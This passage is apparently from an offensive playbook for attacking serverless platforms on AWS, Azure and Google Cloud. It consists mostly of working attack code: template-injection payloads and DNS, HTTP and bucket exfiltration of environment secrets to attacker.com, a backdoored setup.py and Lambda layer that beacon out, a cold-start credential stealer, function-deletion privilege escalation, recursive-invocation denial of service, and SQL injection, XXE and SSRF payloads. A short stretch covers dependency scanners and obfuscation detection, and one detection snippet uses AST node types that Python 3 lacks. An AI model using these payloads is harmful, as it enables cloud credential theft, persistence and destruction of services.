PAYLOAD='{{ self.__init__.__globals__.__builtins__.__import__("os").popen("whoami").read() }}'

# Exfiltrate data
PAYLOAD='{{ self.__init__.__globals__.__builtins__.__import__("os").popen("curl http://attacker.com/exfil?data=$(env|base64)").read() }}'
```

### Automated Dependency Exploitation Tools

#### Snyk Test and Exploit

```bash
# Install Snyk
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities
cd function-directory
snyk test --json > snyk-results.json

# Filter for exploitable vulnerabilities
cat snyk-results.json | jq '.vulnerabilities[] | select(.exploit != null or .malicious == true)'

# Get remediation advice
snyk test --json | jq -r '.vulnerabilities[] | "\(.title): \(.fixedIn)"'

# Monitor function dependencies
snyk monitor
```

#### OSV Scanner

```bash
# Install osv-scanner
go install github.com/google/osv-scanner/cmd/osv-scanner@latest

# Scan directory
osv-scanner --lockfile=package-lock.json

# Scan with SBOM
osv-scanner --sbom=sbom.json

# Output JSON for parsing
osv-scanner --lockfile=requirements.txt --format=json > osv-results.json
```

#### Retire.js (Node.js specific)

```bash
# Install retire.js
npm install -g retire

# Scan Node.js dependencies
retire --path ./function-code --outputformat json --outputpath retire-results.json

# Check for specific vulnerabilities
retire --path ./function-code | grep -A 5 "Severity: high\|Severity: critical"
```

### Exploitation via Transitive Dependencies

#### Discovering Hidden Dependencies

```bash
# Python - show full dependency tree
pip3 install pipdeptree
pipdeptree -p package-name

# Find vulnerable transitive dependencies
pipdeptree --warn silence | grep -B 5 -A 5 "vulnerable-package"

# Node.js - show dependency tree
npm ls

# Show only production dependencies
npm ls --production --depth=10

# Find specific vulnerable package in tree
npm ls vulnerable-package
```

#### Exploiting Indirect Dependencies

```bash
# Example: Application uses package A, which depends on vulnerable package B
# Check if vulnerable package is actually loaded

# For Python - trace imports at runtime
python3 -c "import sys; import package_a; print('\n'.join(sys.modules.keys()))" | grep vulnerable_package

# For Node.js - check require cache
node -e "require('package-a'); console.log(Object.keys(require.cache).filter(k => k.includes('vulnerable-package')))"

# If vulnerable package is loaded, craft exploit targeting it through main package
```

### Defense Evasion in Dependency Attacks

#### Obfuscating Malicious Code in Dependencies

```python
# [Inference] Example of obfuscated malicious code that might evade scanning
# This is for detection purposes only

import base64
exec(base64.b64decode(b'aW1wb3J0IG9zO29zLnN5c3RlbSgiY3VybCBodHRwOi8vYXR0YWNrZXIuY29tIik='))

# Encrypted payload
import cryptography.fernet
key = b'stored_elsewhere'
f = cryptography.fernet.Fernet(key)
exec(f.decrypt(b'encrypted_payload'))

# Dynamic import
__import__('os').__dict__['sy'+'stem']('malicious command')
```

#### Detecting Obfuscated Code

```bash
# Search for base64 decode patterns
grep -r "base64.b64decode\|base64.decodebytes" function-code/

# Search for exec/eval usage
grep -r "exec(\|eval(" function-code/

# Search for dynamic imports
grep -r "__import__\|importlib.import_module" function-code/

# Use AST analysis
python3 -c "
import ast
import sys

with open('suspicious_file.py', 'r') as f:
    tree = ast.parse(f.read())
    
for node in ast.walk(tree):
    if isinstance(node, (ast.Exec, ast.Eval)):
        print(f'Found exec/eval at line {node.lineno}')
    elif isinstance(node, ast.Call):
        if hasattr(node.func, 'id') and node.func.id == '__import__':
            print(f'Found dynamic import at line {node.lineno}')
"
```

### Real-Time Dependency Monitoring

#### Webhook-Based Vulnerability Alerts

```bash
# Set up GitHub Dependabot alerts
# Configure in repository settings

# Query GitHub Security API for vulnerabilities
curl -H "Authorization: token GITHUB_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/vulnerability-alerts"

# Snyk webhook integration
curl -X POST "https://api.snyk.io/v1/org/ORG_ID/webhooks" \
  -H "Authorization: token SNYK_TOKEN" \
  -d '{"url":"https://your-webhook-endpoint.com","events":["new-vulnerability"]}'
```

#### Continuous Scanning in CI/CD

```yaml
# Example GitHub Actions workflow
name: Dependency Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
```

---

## Advanced Exploitation Techniques

### Chaining Vulnerabilities

#### Cold Start + Dependency Vulnerability Chain

```bash
# Scenario: Exploit vulnerable dependency during cold start initialization

# 1. Force cold start
sleep 900  # Wait for function to go cold

# 2. Trigger function with payload that exploits vulnerable init code
aws lambda invoke \
  --function-name FUNCTION_NAME \
  --payload '{"trigger":"exploit"}' \
  response.json

# 3. Vulnerable initialization code executes with payload
# Example: YAML deserialization during config loading in global scope
```

#### Event Injection + SSRF + Metadata Service

```bash
# Complete attack chain for AWS Lambda

# 1. Inject malicious S3 event
aws s3 cp exploit-file.txt s3://trigger-bucket/

# 2. Function processes file, vulnerable code triggers SSRF
# Vulnerable function code:
# url = f"http://{bucket}.s3.amazonaws.com/{key}"
# requests.get(url)

# 3. Exploit: filename contains SSRF payload
touch "169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role"
aws s3 cp "169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role" s3://trigger-bucket/

# 4. Function makes request to metadata service, leaks credentials
```

### Persistence Mechanisms

#### Backdoored Dependency Installation

```bash
# Upload malicious package to private package repository

# 1. Create backdoored package
mkdir malicious-package
cd malicious-package

cat > setup.py <<'EOF'
from setuptools import setup
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Backdoor: runs on every cold start
        os.system('curl http://attacker.com/beacon?function=$AWS_LAMBDA_FUNCTION_NAME')

setup(
    name='legitimate-package-name',
    version='1.0.1',  # Higher than legitimate version
    cmdclass={'install': PostInstallCommand},
)
EOF

# 2. Upload to private PyPI/repository
# 3. Function installs backdoored version on next deployment
```

#### Layer-Based Persistence

```bash
# Create malicious Lambda layer

mkdir python
cat > python/backdoor.py <<'EOF'
import atexit
import os

def exfiltrate():
    os.system('curl http://attacker.com/exfil?env=$(env|base64)')

# Runs on every invocation
atexit.register(exfiltrate)
EOF

# Package layer
zip -r layer.zip python/

# Publish layer (requires permissions)
aws lambda publish-layer-version \
  --layer-name malicious-layer \
  --zip-file fileb://layer.zip \
  --compatible-runtimes python3.9

# Attach to target function (requires permissions)
aws lambda update-function-configuration \
  --function-name TARGET_FUNCTION \
  --layers arn:aws:lambda:us-east-1:ACCOUNT:layer:malicious-layer:1
```

**Key Serverless Security Tools:**

- **Pacu** - AWS exploitation framework
- **ScoutSuite** - Multi-cloud security auditing
- **Trivy** - Comprehensive vulnerability scanner
- **Snyk** - Dependency vulnerability management
- **Safety/pip-audit** - Python security scanning
- **npm audit** - Node.js security scanning
- **OWASP Dependency-Check** - Multi-language scanning
- **OSV Scanner** - Open-source vulnerability scanner
- **Retire.js** - JavaScript library vulnerability scanner

**Important Related Topics:**

- **Serverless Application Repository (SAR) exploitation** - Malicious application deployment
- **Step Functions state machine manipulation** - Workflow injection attacks
- **EventBridge rule hijacking** - Event routing manipulation
- **Secrets Manager/Parameter Store extraction** - Credential harvesting from serverless apps
- **VPC Lambda security** - ENI exploitation and network pivoting
- **Container escape in Lambda** - Breaking out of execution environment (rare but theoretical)

---

## Environment Variable Extraction

### Detection & Discovery

**Identifying Serverless Environment:**

```bash
# AWS Lambda indicators
env | grep AWS_LAMBDA
env | grep LAMBDA_
ls -la /var/runtime/
cat /proc/self/cgroup | grep fargate

# Azure Functions indicators
env | grep AZURE_FUNCTIONS
env | grep WEBSITE_
ls -la /home/site/wwwroot/

# Google Cloud Functions indicators
env | grep FUNCTION_
env | grep GCP_
env | grep K_SERVICE

# General serverless detection
env | grep -E "FUNCTION|LAMBDA|SERVERLESS"
```

**Environment Variable Enumeration:**

```bash
# List all environment variables
env
printenv
cat /proc/self/environ | tr '\0' '\n'

# Search for sensitive patterns
env | grep -iE "key|token|secret|password|pass|api|auth|credential|access"

# Common cloud provider patterns
env | grep -iE "aws|azure|gcp|s3|bucket|database|db|sql|mongo|redis"

# Service-specific variables
env | grep -E "DATABASE_URL|CONNECTION_STRING|MONGODB_URI|REDIS_URL"
```

### AWS Lambda Environment Variables

**Standard Lambda Variables:**

```bash
# Lambda runtime information
echo $AWS_LAMBDA_FUNCTION_NAME
echo $AWS_LAMBDA_FUNCTION_VERSION
echo $AWS_LAMBDA_FUNCTION_MEMORY_SIZE
echo $AWS_LAMBDA_LOG_GROUP_NAME
echo $AWS_LAMBDA_LOG_STREAM_NAME

# Runtime paths
echo $LAMBDA_TASK_ROOT          # /var/task
echo $LAMBDA_RUNTIME_DIR        # /var/runtime
echo $_HANDLER                  # handler function name

# AWS region and credentials
echo $AWS_REGION
echo $AWS_DEFAULT_REGION
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY
echo $AWS_SESSION_TOKEN
```

**IAM Role Credential Extraction:**

```bash
# Lambda execution role credentials (temporary)
# These are automatically injected by Lambda runtime
printenv | grep AWS_

# Credentials typically available via environment OR metadata endpoint
# [Inference: Environment variables take precedence over metadata service]
```

**Custom Application Variables:**

```bash
# Application-defined secrets (misconfiguration)
echo $DB_PASSWORD
echo $API_KEY
echo $SECRET_KEY
echo $STRIPE_SECRET_KEY
echo $JWT_SECRET

# Connection strings
echo $DATABASE_URL
echo $MONGODB_URI
echo $REDIS_URL
```

**Lambda Layer Inspection:**

```bash
# Lambda layers mounted at /opt
ls -la /opt/
find /opt -type f -name "*.env" -o -name "config.*" -o -name "*.yaml"

# Extract hardcoded credentials from layers
grep -r "password\|secret\|key" /opt/ 2>/dev/null
```

### Azure Functions Environment Variables

**Azure-Specific Variables:**

```bash
# Function runtime info
echo $FUNCTIONS_WORKER_RUNTIME       # node, python, dotnet, etc.
echo $FUNCTIONS_EXTENSION_VERSION
echo $WEBSITE_SITE_NAME
echo $WEBSITE_INSTANCE_ID

# Azure storage (function app backend)
echo $AzureWebJobsStorage
echo $WEBSITE_CONTENTAZUREFILECONNECTIONSTRING

# Application Insights
echo $APPINSIGHTS_INSTRUMENTATIONKEY
echo $APPLICATIONINSIGHTS_CONNECTION_STRING
```

**Managed Identity Token Access:**

```bash
# MSI_ENDPOINT and MSI_SECRET available if Managed Identity enabled
echo $MSI_ENDPOINT
echo $MSI_SECRET
echo $IDENTITY_ENDPOINT
echo $IDENTITY_HEADER

# Extract access token for Azure resources
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"

# Token for Azure Storage
curl "$IDENTITY_ENDPOINT?resource=https://storage.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

**App Settings Extraction:**

```bash
# Azure stores custom variables as App Settings
env | grep -v "^WEBSITE_\|^FUNCTIONS_\|^HOME\|^PATH"

# Common misconfigurations
echo $SQL_CONNECTION_STRING
echo $COSMOS_DB_CONNECTION_STRING
echo $STORAGE_CONNECTION_STRING
```

### Google Cloud Functions Environment Variables

**GCP-Specific Variables:**

```bash
# Function metadata
echo $FUNCTION_NAME
echo $FUNCTION_REGION
echo $FUNCTION_TARGET           # Entry point
echo $GCP_PROJECT
echo $GCLOUD_PROJECT

# Service identity
echo $K_SERVICE
echo $K_REVISION
echo $K_CONFIGURATION
```

**Service Account Token Extraction:**

```bash
# Metadata service access (GCP equivalent of AWS IMDS)
# Default: http://metadata.google.internal/

# Get access token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get service account email
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Project metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
```

### Metadata Service Exploitation

**AWS Lambda Metadata (IMDSv2 not applicable):**

```bash
# Lambda uses environment variables, not traditional IMDS
# [Inference: Lambda execution environment is isolated, no direct IMDS access]

# However, temporary credentials available via environment
aws sts get-caller-identity --region $AWS_REGION
```

**Azure App Service Metadata:**

```bash
# Instance metadata endpoint
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# [Unverified: Standard IMDS may be filtered in Azure Functions runtime]
```

**GCP Metadata Service:**

```bash
# Recursive metadata dump
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true"

# SSH keys
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Custom metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
```

### Configuration File Extraction

**Application Configuration Files:**

```bash
# Common locations
cat /var/task/.env
cat /var/task/config.json
cat /var/task/config.yaml
cat /opt/.env

# Python configurations
cat /var/task/settings.py
cat /var/task/config.py

# Node.js configurations
cat /var/task/.env
cat /var/task/config.js
cat /var/task/package.json

# .NET configurations
cat /var/task/appsettings.json
cat /var/task/web.config
```

**Hardcoded Credentials Search:**

```bash
# Recursive search for secrets
find /var/task -type f -exec grep -iH "password\|secret\|api_key\|token" {} \; 2>/dev/null

# Language-specific patterns
# Python
grep -r "os.environ\|getenv\|config\[" /var/task/*.py

# Node.js
grep -r "process.env\|require.*config" /var/task/*.js

# Look for cloud SDK config files
find ~ -name ".aws" -o -name ".azure" -o -name ".config/gcloud"
cat ~/.aws/credentials
cat ~/.aws/config
```

### Runtime Memory Extraction

**Process Memory Dump:**

```bash
# Dump process environment (limited by execution time)
cat /proc/self/environ | tr '\0' '\n' | grep -i secret

# Core dump analysis (if available)
gcore $$
strings core.* | grep -iE "key|token|password"

# [Unverified: Core dumps typically disabled in serverless environments]
```

**Language-Specific Memory Access:**

```python
# Python - Access global environment
import os
import json

secrets = {}
for key, value in os.environ.items():
    if any(term in key.lower() for term in ['key', 'secret', 'password', 'token']):
        secrets[key] = value

print(json.dumps(secrets, indent=2))
```

```javascript
// Node.js - Extract from process environment
const secrets = Object.keys(process.env)
  .filter(key => /key|secret|password|token/i.test(key))
  .reduce((obj, key) => {
    obj[key] = process.env[key];
    return obj;
  }, {});

console.log(JSON.stringify(secrets, null, 2));
```

### Exfiltration Techniques

**DNS Exfiltration:**

```bash
# Encode secret in DNS query
SECRET=$(echo $AWS_SECRET_ACCESS_KEY | base64)
nslookup $SECRET.attacker.com

# Chunked exfiltration for large secrets
for chunk in $(echo $SECRET | fold -w 63); do
  nslookup $chunk.attacker.com
done
```

**HTTP Exfiltration:**

```bash
# POST to external endpoint
curl -X POST https://attacker.com/exfil \
  -H "Content-Type: application/json" \
  -d "{\"env\": $(env | jq -R -s -c 'split(\"\n\")')}"

# GET with URL encoding
curl "https://attacker.com/?secret=$(echo $API_KEY | jq -sRr @uri)"
```

**Cloud Storage Exfiltration:**

```bash
# AWS S3 (if credentials available)
aws s3 cp <(env) s3://attacker-bucket/lambda-secrets.txt --region us-east-1

# Azure Blob Storage
az storage blob upload --account-name attacker --container exfil --name secrets.txt --file <(env)

# GCS
gsutil cp <(env) gs://attacker-bucket/secrets.txt
```

## Function Chaining Attacks

### Cross-Function Invocation

**AWS Lambda Invocation:**

```bash
# Using AWS CLI (if credentials available)
aws lambda invoke \
  --function-name target-function \
  --payload '{"key": "value"}' \
  --region us-east-1 \
  response.json

# Asynchronous invocation
aws lambda invoke \
  --function-name target-function \
  --invocation-type Event \
  --payload '{"exploit": "payload"}' \
  --region us-east-1 \
  response.json

# List available functions
aws lambda list-functions --region us-east-1
```

**Using AWS SDK in Lambda:**

```python
# Python boto3
import boto3
import json

lambda_client = boto3.client('lambda')

# Synchronous invoke
response = lambda_client.invoke(
    FunctionName='target-function',
    InvocationType='RequestResponse',
    Payload=json.dumps({'attack': 'payload'})
)

result = json.loads(response['Payload'].read())
print(result)

# Asynchronous invoke (fire and forget)
lambda_client.invoke(
    FunctionName='sensitive-function',
    InvocationType='Event',
    Payload=json.dumps({'malicious': 'data'})
)
```

```javascript
// Node.js AWS SDK
const AWS = require('aws-sdk');
const lambda = new AWS.Lambda();

// Invoke another function
const params = {
  FunctionName: 'target-function',
  InvocationType: 'RequestResponse',
  Payload: JSON.stringify({attack: 'payload'})
};

lambda.invoke(params, (err, data) => {
  if (err) console.log(err);
  else console.log(JSON.parse(data.Payload));
});
```

**Azure Functions Invocation:**

```bash
# HTTP-triggered function call
curl -X POST https://function-app.azurewebsites.net/api/target-function \
  -H "Content-Type: application/json" \
  -d '{"attack": "payload"}'

# With function key
curl -X POST https://function-app.azurewebsites.net/api/target-function?code=FUNCTION_KEY \
  -d '{"exploit": "data"}'
```

```python
# Python invocation via Azure SDK
from azure.identity import DefaultAzureCredential
from azure.mgmt.web import WebSiteManagementClient
import requests

# Get function keys
credential = DefaultAzureCredential()
web_client = WebSiteManagementClient(credential, subscription_id)

# Direct HTTP call
response = requests.post(
    'https://function-app.azurewebsites.net/api/target',
    json={'malicious': 'payload'},
    headers={'x-functions-key': function_key}
)
```

**Google Cloud Functions Invocation:**

```bash
# HTTP-triggered function
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/function-name \
  -H "Content-Type: application/json" \
  -d '{"attack": "payload"}'

# With authentication
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/function-name \
  -H "Authorization: bearer $(gcloud auth print-identity-token)" \
  -H "Content-Type: application/json" \
  -d '{"exploit": "data"}'
```

### Permission Escalation via Chaining

**Privilege Boundary Bypass:**

```python
# [Inference] Low-privilege function invoking high-privilege function
# Example: Public-facing function -> Admin function

import boto3

def lambda_handler(event, context):
    # This function has minimal permissions
    # But can invoke admin function if policies misconfigured
    
    lambda_client = boto3.client('lambda')
    
    # Invoke privileged function
    response = lambda_client.invoke(
        FunctionName='admin-database-function',
        Payload='{"action": "drop_table", "table": "users"}'
    )
    
    return response['Payload'].read()
```

**IAM Role Assumption Chain:**

```python
# Function A assumes role for Function B
import boto3

sts_client = boto3.client('sts')

# Assume more privileged role
assumed_role = sts_client.assume_role(
    RoleArn='arn:aws:iam::ACCOUNT:role/PrivilegedRole',
    RoleSessionName='escalation-session'
)

credentials = assumed_role['Credentials']

# Create client with escalated credentials
lambda_client = boto3.client(
    'lambda',
    aws_access_key_id=credentials['AccessKeyId'],
    aws_secret_access_key=credentials['SecretAccessKey'],
    aws_session_token=credentials['SessionToken']
)

# Execute privileged operations
lambda_client.delete_function(FunctionName='security-monitor')
```

### Recursive Invocation (DoS)

**Self-Invocation Loop:**

```python
# AWS Lambda recursive bomb
import boto3

lambda_client = boto3.client('lambda')

def lambda_handler(event, context):
    count = event.get('count', 0)
    
    # Spawn multiple instances of self
    for i in range(10):
        lambda_client.invoke(
            FunctionName=context.function_name,
            InvocationType='Event',
            Payload=json.dumps({'count': count + 1})
        )
    
    return {'count': count}

# [Inference: Limited by concurrent execution limits (default 1000) and budget]
```

**Cross-Function Invocation Cycle:**

```python
# Function A invokes Function B, B invokes C, C invokes A
# Creates resource exhaustion

# function_a.py
import boto3
lambda_client = boto3.client('lambda')

def handler(event, context):
    lambda_client.invoke(
        FunctionName='function-b',
        InvocationType='Event',
        Payload='{}'
    )

# function_b.py invokes function_c
# function_c.py invokes function_a
# [Inference: Can bypass simple recursion detection]
```

### State Machine Exploitation

**AWS Step Functions Abuse:**

```json
# Step Functions state machine manipulation
{
  "Comment": "Malicious state machine",
  "StartAt": "ExfiltrateData",
  "States": {
    "ExfiltrateData": {
      "Type": "Task",
      "Resource": "arn:aws:lambda:region:account:function:victim-function",
      "Next": "SendToAttacker"
    },
    "SendToAttacker": {
      "Type": "Task",
      "Resource": "arn:aws:lambda:region:account:function:exfil-function",
      "End": true
    }
  }
}
```

```bash
# Start malicious execution
aws stepfunctions start-execution \
  --state-machine-arn arn:aws:states:region:account:stateMachine:malicious \
  --input '{"target": "sensitive-data"}'
```

### Event Source Manipulation

**SQS Queue Poisoning:**

```python
# Inject malicious messages into queue processed by Lambda
import boto3

sqs = boto3.client('sqs')

# Flood queue with malicious payloads
for i in range(1000):
    sqs.send_message(
        QueueUrl='https://sqs.region.amazonaws.com/account/victim-queue',
        MessageBody=json.dumps({
            'command': 'exec',
            'payload': 'rm -rf /',
            'iteration': i
        })
    )

# [Inference: If Lambda processes messages without validation, code execution possible]
```

**SNS Topic Injection:**

```bash
# Publish to SNS topic that triggers multiple Lambda functions
aws sns publish \
  --topic-arn arn:aws:sns:region:account:victim-topic \
  --message '{"exploit": "payload", "command": "malicious"}' \
  --region us-east-1

# Fan-out pattern exploits trigger multiple functions simultaneously
```

### Timing-Based Chain Attacks

**Race Condition Exploitation:**

```python
# Invoke multiple functions simultaneously to create race condition
import boto3
import concurrent.futures

lambda_client = boto3.client('lambda')

def invoke_function(payload):
    return lambda_client.invoke(
        FunctionName='race-condition-target',
        InvocationType='RequestResponse',
        Payload=json.dumps(payload)
    )

# Launch concurrent invocations
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    payloads = [{'user_id': 'victim', 'action': 'withdraw', 'amount': 1000} for _ in range(50)]
    results = executor.map(invoke_function, payloads)

# [Inference: Exploit time-of-check to time-of-use (TOCTOU) vulnerabilities]
```

### Cold Start Exploitation

**Initialization Hook Abuse:**

```python
# Code outside handler runs during cold start only
import os
import boto3

# This runs once per container initialization
if 'COLD_START_EXPLOIT' not in os.environ:
    s3 = boto3.client('s3')
    # Exfiltrate credentials during cold start
    secrets = {k: v for k, v in os.environ.items() if 'KEY' in k or 'SECRET' in k}
    s3.put_object(
        Bucket='attacker-bucket',
        Key='cold-start-secrets.json',
        Body=json.dumps(secrets)
    )
    os.environ['COLD_START_EXPLOIT'] = 'done'

def lambda_handler(event, context):
    # Normal handler logic
    return {'statusCode': 200}
```

## API Trigger Abuse

### Unauthorized API Gateway Access

**API Gateway Enumeration:**

```bash
# Discover API Gateway endpoints
# Common patterns: https://API_ID.execute-api.REGION.amazonaws.com/STAGE/

# Brute force API IDs (10 character alphanumeric)
for id in $(cat api-ids.txt); do
  curl -s "https://$id.execute-api.us-east-1.amazonaws.com/prod/" | grep -v "Forbidden"
done

# Stage enumeration
for stage in prod dev test staging; do
  curl -I "https://API_ID.execute-api.us-east-1.amazonaws.com/$stage/"
done
```

**Authorization Bypass Techniques:**

```bash
# Missing authentication
curl https://API_ID.execute-api.region.amazonaws.com/prod/sensitive-function

# API key in header (if leaked)
curl -H "x-api-key: LEAKED_API_KEY" \
  https://API_ID.execute-api.region.amazonaws.com/prod/admin

# IAM authorization bypass via AWS Signature (if credentials available)
aws apigatewaymanagementapi post-to-connection \
  --connection-id CONNECTION_ID \
  --data '{"exploit": "payload"}' \
  --endpoint-url https://API_ID.execute-api.region.amazonaws.com/prod
```

**Lambda Function URL Exploitation:**

```bash
# Lambda Function URLs (newer feature, simpler than API Gateway)
# Format: https://FUNCTION_URL_ID.lambda-url.REGION.on.aws/

# Unauthenticated access (misconfiguration)
curl https://abc123xyz.lambda-url.us-east-1.on.aws/ \
  -X POST \
  -d '{"malicious": "payload"}'

# CORS misconfiguration
curl https://abc123xyz.lambda-url.us-east-1.on.aws/ \
  -H "Origin: https://evil.com" \
  -v
```

### HTTP Parameter Injection

**Query String Manipulation:**

```bash
# SQL Injection via API Gateway parameters
curl "https://API_ID.execute-api.region.amazonaws.com/prod/users?id=1' OR '1'='1"

# Command injection
curl "https://API_ID.execute-api.region.amazonaws.com/prod/exec?cmd=ls;id;cat /etc/passwd"

# Path traversal
curl "https://API_ID.execute-api.region.amazonaws.com/prod/file?path=../../../../etc/passwd"
```

**Header Injection:**

```bash
# Host header injection
curl https://API_ID.execute-api.region.amazonaws.com/prod/ \
  -H "Host: attacker.com"

# X-Forwarded-For spoofing (IP whitelist bypass)
curl https://API_ID.execute-api.region.amazonaws.com/prod/ \
  -H "X-Forwarded-For: 127.0.0.1"

# Custom header injection
curl https://API_ID.execute-api.region.amazonaws.com/prod/ \
  -H "X-Admin: true" \
  -H "X-Role: administrator"
```

**Body Manipulation:**

```bash
# JSON injection
curl -X POST https://API_ID.execute-api.region.amazonaws.com/prod/user \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "role": "admin", "isAdmin": true}'

# XML External Entity (XXE)
curl -X POST https://API_ID.execute-api.region.amazonaws.com/prod/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'

# Prototype pollution (Node.js)
curl -X POST https://API_ID.execute-api.region.amazonaws.com/prod/ \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
```

### Event Source Trigger Manipulation

**S3 Event Trigger Abuse:**

```bash
# Upload malicious files to trigger Lambda
aws s3 cp malicious.jpg s3://bucket-with-lambda-trigger/

# File extension bypass
aws s3 cp malicious.php.jpg s3://bucket/  # If Lambda checks extension naively

# Zip bomb (resource exhaustion)
aws s3 cp 42.zip s3://bucket-with-unzip-lambda/
# [Inference: 42.zip is famous zip bomb expanding to petabytes]

# Path traversal in S3 key
aws s3 cp file.txt "s3://bucket/../../../etc/passwd"
```

**DynamoDB Stream Exploitation:**

```bash
# Insert malicious data into DynamoDB table with stream trigger
aws dynamodb put-item \
  --table-name target-table \
  --item '{
    "id": {"S": "attack"},
    "command": {"S": "rm -rf /"},
    "eval": {"S": "__import__(\"os\").system(\"curl attacker.com\")"}
  }'

# [Inference: If Lambda processes stream records without sanitization]
```

**SQS/SNS Trigger Flooding:**

```bash
# Flood SQS queue to cause resource exhaustion
for i in {1..10000}; do
  aws sqs send-message \
    --queue-url https://sqs.region.amazonaws.com/account/queue \
    --message-body "Attack $i" &
done

# Cost amplification attack
# [Inference: Each message triggers Lambda execution, accruing costs]
```

**CloudWatch Events/EventBridge Abuse:**

```bash
# Inject custom events if permissions misconfigured
aws events put-events \
  --entries '[
    {
      "Source": "custom.application",
      "DetailType": "malicious-event",
      "Detail": "{\"command\": \"exploit\"}",
      "EventBusName": "default"
    }
  ]'

# Schedule malicious recurring executions
aws events put-rule \
  --name malicious-schedule \
  --schedule-expression "rate(1 minute)"

aws events put-targets \
  --rule malicious-schedule \
  --targets "Id"="1","Arn"="arn:aws:lambda:region:account:function:victim"
```

### Rate Limit Bypass

**Distributed Invocation:**

```bash
# Bypass rate limits using multiple source IPs (cloud functions as proxies)
# Deploy attack functions in multiple regions

# us-east-1 function
aws lambda invoke --function-name attack --region us-east-1

# eu-west-1 function
aws lambda invoke --function-name attack --region eu-west-1

# [Inference: Each region has separate rate limit pool]
```

**Token Bucket Exhaustion:**

```bash
# Rapidly consume rate limit tokens
parallel -j 100 curl -X POST https://api.example.com/function ::: {1..1000}

# Slow-rate attack (below detection threshold but sustained)
while true; do
  curl -X POST https://api.example.com/sensitive-function
  sleep 2
done
```

### Insecure Direct Object Reference (IDOR)

**Resource ID Enumeration:**

```bash
# Enumerate function invocations
for id in {1..1000}; do
  curl "https://api.example.com/function/result/$id"
done

# S3 bucket enumeration via Lambda
curl "https://api.example.com/download?file=user123-data.txt"
curl "https://api.example.com/download?file=user124-data.txt"
```

### Webhook/Callback Manipulation

**SSRF via Callback URLs:**

```bash
# Provide attacker-controlled callback URL
curl -X POST https://api.example.com/process \
  -d '{
    "data": "input",
    "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'

# Internal service scanning
curl -X POST https://api.example.com/notify \
  -d '{"webhook": "http://internal-admin:8080/secrets"}'
```

**DNS Rebinding:**

```bash
# Domain resolves to attacker IP initially, then internal IP
curl -X POST https://api.example.com/fetch \
  -d '{"url": "http://rebind.attacker.com/exfil"}'

# [Unverified: Depends on DNS caching and timing]
```

### Cold Start Race Conditions

**Initialization Exploit:**

```bash
# Send burst of requests during cold start window
# Initial requests may execute before security checks initialize

for i in {1..100}; do
  curl -X POST https://api.example.com/admin \
    -d '{"action": "delete_all"}' &
done

# [Inference: Exploit window between container start and security middleware loading]
```

### Azure Functions HTTP Trigger Exploitation

**Anonymous HTTP Access:**

```bash
# Enumerate function apps
curl https://FUNCTION_APP.azurewebsites.net/api/

# Authorization level bypass
curl https://FUNCTION_APP.azurewebsites.net/api/function-name?code=

# Master key extraction (from configuration)
# [Unverified: Requires access to App Service configuration]
```

**SCM/Kudu Endpoint Access:**

```bash
# Azure App Service SCM endpoint (deployment/management)
curl https://FUNCTION_APP.scm.azurewebsites.net/

# Download function source code
curl https://FUNCTION_APP.scm.azurewebsites.net/api/zip/site/wwwroot/ -o source.zip

# [Inference: SCM credentials sometimes reused or weak]
```

### Google Cloud Functions HTTP Trigger Abuse

**Unauthenticated Function Access:**

```bash
# Public HTTP functions
curl https://REGION-PROJECT.cloudfunctions.net/function-name

# Authentication header manipulation
curl https://REGION-PROJECT.cloudfunctions.net/function-name \
  -H "Authorization: Bearer fake-token"
```

**Cloud Scheduler Abuse:**

```bash
# If Cloud Scheduler has overly permissive IAM
gcloud scheduler jobs create http malicious-job \
  --schedule="* * * * *" \
  --uri="https://REGION-PROJECT.cloudfunctions.net/admin-function" \
  --http-method=POST \
  --message-body='{"action":"delete"}'
```

### WebSocket API Exploitation

**AWS API Gateway WebSocket:**

```bash
# Connection hijacking
wscat -c wss://API_ID.execute-api.region.amazonaws.com/prod

# Send to specific connection (if connection IDs leaked)
aws apigatewaymanagementapi post-to-connection \
  --connection-id "VICTIM_CONNECTION_ID" \
  --data '{"malicious": "payload"}' \
  --endpoint-url https://API_ID.execute-api.region.amazonaws.com/prod
```

---

## Key Tools Summary

**Environment Enumeration:**

- `env`, `printenv` - Environment variable listing
- `grep` - Pattern matching for secrets
- `curl` - Metadata service access
- `aws`, `az`, `gcloud` CLI - Cloud API interaction

